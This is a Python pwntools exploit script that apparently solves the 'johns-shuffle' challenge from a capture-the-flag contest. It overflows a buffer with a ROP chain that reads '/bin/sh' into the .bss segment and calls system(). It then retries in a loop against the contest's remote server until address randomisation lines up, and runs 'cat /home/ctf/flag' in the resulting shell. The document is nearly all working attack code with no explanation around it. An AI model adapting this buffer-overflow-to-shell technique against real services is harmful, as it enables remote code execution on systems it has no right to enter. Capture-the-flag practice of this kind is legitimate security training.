from pwn import *

elf = ELF('johns-shuffle')
rop = ROP(elf)

add_esp_8 = rop.pivots[8]
system = elf.symbols['system']

# Found system in ELF
log.info("System: {}".format(hex(system)))

# ROP shellcode
# read '/bin/sh' into a known location
# call /bin/sh from known location via system
rop.read(0, elf.bss(), 8)
rop.system(elf.bss())

# Set up our payload 
payload = 'b' * 166
payload += str(rop)
payload += cyclic(1000)

print rop.dump()

log.info("You can walk away.. this might take while..")
log.info("Waiting on the randomization to work")
while True:
    try:
        # r = process('./johns-shuffle')
        with remote('shuffle.polictf.it', 80) as r:

            # Debug code
            '''
            gdb.attach(r, """
            bp {}
            c
            """.format(hex(elf.symbols['read'])))
            '''

            # PWN
            r.sendline(payload)

            # Sleep enough to wait for the read() call to hit
            sleep(0.2)

            # Write /bin/sh in the .bss segment to use with our system() ROP
            r.sendline('/bin/sh\x00')

            # Command to send to our new shell
            r.sendline('cat /home/ctf/flag')

            # Be sure to retrieve the flag from the socket
            for _ in xrange(4):
                output = r.recv()
                if 'flag' in output.lower():
                    log.info('FLAG: {}'.format(output))
                    raw_input()
    except:
        pass
